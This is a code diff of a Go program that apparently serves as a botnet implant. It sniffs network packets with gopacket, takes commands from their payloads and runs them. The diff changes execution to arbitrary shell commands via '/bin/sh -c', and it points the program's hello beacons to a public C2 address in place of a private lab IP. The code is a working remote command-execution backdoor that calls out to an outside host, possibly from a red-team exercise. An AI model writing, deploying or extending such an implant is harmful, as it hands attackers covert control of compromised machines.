@@ -43,15 +43,18 @@ func botProcessPacket(packet gopacket.Packet) {
 	// Split into list to get command and args
 	payload := strings.Split(data, " ")
 	fmt.Println("[+] PAYLOAD:", payload)
-	command := payload[1]
-	args := payload[2:]
+
+	// Split the string to get the important parts
+	splitcommands := payload[1:]
+	// Rejoin string to put into a single bash command string
+	command := strings.Join(splitcommands, " ")
 
 	// Only run command if we didn't just run it
 	if lastCmdRan != command {
-		fmt.Println("[+] ARGS:", args)
+		fmt.Println("[+] COMMAND:", command)
 
 		// Run the command and get output
-		out, err := exec.Command(command, args...).Output()
+		out, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
 		if err != nil {
 			fmt.Println("\n[-] ERROR:", err)
 		}
@@ -88,7 +91,7 @@ func main() {
 	// Start hello timer
 	// Set the below IP to the IP of the C2
 	// 192.168.4.6
-	go sendHello(iface, src, net.IPv4(192, 168, 4, 6), dstMAC)
+	go sendHello(iface, src, net.IPv4(18, 191, 209, 30), dstMAC)
 
 	// Listen for responses
 	fmt.Println("[+] Listening")
